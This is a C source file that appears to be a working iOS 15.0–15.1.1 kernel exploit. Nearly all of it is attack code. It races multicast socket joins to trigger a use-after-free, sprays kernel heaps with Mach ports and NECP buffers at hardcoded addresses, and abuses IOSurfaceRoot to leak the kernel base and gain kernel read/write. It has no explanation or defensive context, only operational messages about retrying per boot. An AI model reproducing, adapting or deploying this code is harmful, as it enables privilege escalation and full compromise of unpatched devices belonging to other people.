#include "exploit.h"
#include "iokit.h"
#include "IOGPU.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "kernel_base.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#define KHEAP_DATA_MAPPABLE_LOC 0xFFFFFFE383200000
#define KHEAP_DEFAULT_MAPPABLE_LOC 0xFFFFFFE376000000
#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6)
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 3 - BYTECOPY_OFFSET_IPV6)
#define BYTECOPY_OFFSET_IPV6 0x28
#define PORTS_COUNT 0x2A00
#define KMSG_SIZE 0x3F80
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64

mach_port_t notif_port = MACH_PORT_NULL;
mach_port_t *kheap_default_ports = NULL;
uint8_t *IOSurfaceClient_array_buf = NULL;
mach_port_t *kheap_data_ports = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;

mach_port_t get_arb_free_holder(void) {
    int success = 0;

    for (int i = 0; i < 3; ++i) {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }

    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);

    uint8_t *necp_buf = malloc(4096);
    if (!necp_buf) {
        printf("Memory allocation failed\n");
        exit(1);
    }
    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET;

    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;

    for (int iterations = 0; iterations < 255; ++iterations) {
        pthread_t pt1, pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);

        if (s == -1 || necp_fd == -1) {
            printf("Socket or NECP open failed\n");
            free(necp_buf);
            exit(1);
        }

        mcast_race_sock = s;

        for (int ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT - 2; ++ip) {
            mcast_join_group(ip);
        }

        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(UAF_BUFFER_KALLOC_1664_JOIN_COUNT - 2));
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(UAF_BUFFER_KALLOC_1664_JOIN_COUNT - 1));

        for (int i = 0; i < 10; ++i) {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }

        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);

        for (int i = 0; i < PORTS_COUNT; ++i) {
            int sz = port_peek_trailer_size(kheap_data_ports[i]);
            if (sz != 8) {
                printf("kheap_data_idx: %08X\n", i);
                kheap_data_idx = i;
                break;
            }
        }

        if (kheap_data_idx != -1) {
            success = 1;
            break;
        }

        close(s);
        printf("iteration %d\n", iterations);
    }

    if (!success) {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 15.0 - 15.1.1 and reboot to try again\n");
        free(necp_buf);
        exit(1);
    }

    free(necp_buf);
    return kheap_data_ports[kheap_data_idx];
}

int exploitation_init(void) {
    extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
    if (extra_frees_for_device == -1) {
        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
        return 1;
    }

    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x4000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);

    if (!kheap_data_ports || !kheap_default_ports || !contained_ports || !ool_ports || !kheap_data_spray_buf) {
        printf("Memory allocation failed\n");
        free(kheap_data_ports);
        free(kheap_default_ports);
        free(contained_ports);
        free(ool_ports);
        free(kheap_data_spray_buf);
        return 1;
    }

    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_data_spray_buf, 0, 0x4000);

    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000;
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;

    for (int i = 0; i < PORTS_COUNT; ++i) {
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);

        kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }

    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i) {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }

    IOSurfaceClient_array_buf = malloc(0x4000);
    if (!IOSurfaceClient_array_buf) {
        printf("Memory allocation failed\n");
        free(kheap_data_ports);
        free(kheap_default_ports);
        free(contained_ports);
        free(ool_ports);
        free(kheap_data_spray_buf);
        return 1;
    }
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);

    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);

    return 0;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base) {
    uint8_t msg_buf[0x100];
    int fildes[2];
    if (pipe(fildes) != 0) {
        printf("Pipe creation failed\n");
        return 1;
    }
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];

    io_connect_t iosurface_connect_krw = IOSurfaceRoot_init();
    if (iosurface_connect_krw == MACH_PORT_NULL) {
        printf("IOSurfaceRoot_init failed\n");
        close(read_pipe);
        close(write_pipe);
        return 1;
    }

    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x4000();

    port_destroy(arb_free_holder);

    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);
    IOSurfaceRoot_release_all(iosurface_connect_krw);

    int kheap_default_idx = -1;
    for (uint32_t i = 0; (i < PORTS_COUNT) && port_has_msg(notif_port); i++) {
        port_receive_msg(notif_port, msg_buf);
        if (*(uint32_t *)msg_buf == 1) {
            kheap_default_idx = i;
        }
    }
    port_destroy(notif_port);

    if (kheap_default_idx == -1) {
        printf("kheap_default_idx invalid\n");
        close(read_pipe);
        close(write_pipe);
        return 1;
    }

    mach_port_t IOSurfaceRoot_default_port = kheap_default_ports[kheap_default_idx];

    uint32_t IOSurface_ID = IOSurfaceRoot_default_lookup_surface_with_seed(IOSurfaceRoot_default_port, KHEAP_DEFAULT_MAPPABLE_LOC, (uint32_t)BYTECOPY_FIRST_TARGET);
    if (!IOSurface_ID) {
        printf("IOSurfaceRoot_default_lookup_surface_with_seed failed\n");
        close(read_pipe);
        close(write_pipe);
        return 1;
    }

    uint64_t IOSurface_address = IOSurfaceRoot_default_get_address_of_surface(IOSurfaceRoot_default_port, IOSurface_ID);
    if (!IOSurface_address) {
        printf("IOSurfaceRoot_default_get_address_of_surface failed\n");
        close(read_pipe);
        close(write_pipe);
        return 1;
    }

    *kernel_base = IOSurfaceRoot_default_get_base(IOSurfaceRoot_default_port, IOSurface_address);
    if (!*kernel_base) {
        printf("IOSurfaceRoot_default_get_base failed\n");
        close(read_pipe);
        close(write_pipe);
        return 1;
    }

    if (!kernel_rw_init(IOSurfaceRoot_default_port, *kernel_base, IOSurface_address)) {
        printf("kernel_rw_init failed\n");
        close(read_pipe);
        close(write_pipe);
        return 1;
    }

    close(read_pipe);
    close(write_pipe);
    return 0;
}

int exploitation_get_krw(uint64_t *kernel_base) {
    if (exploitation_init() != 0) {
        return 1;
    }
    mach_port_t arb_free_holder = get_arb_free_holder();
    if (exploitation_get_krw_with_arb_free(arb_free_holder, kernel_base) != 0) {
        return 1;
    }
    return 0;
}
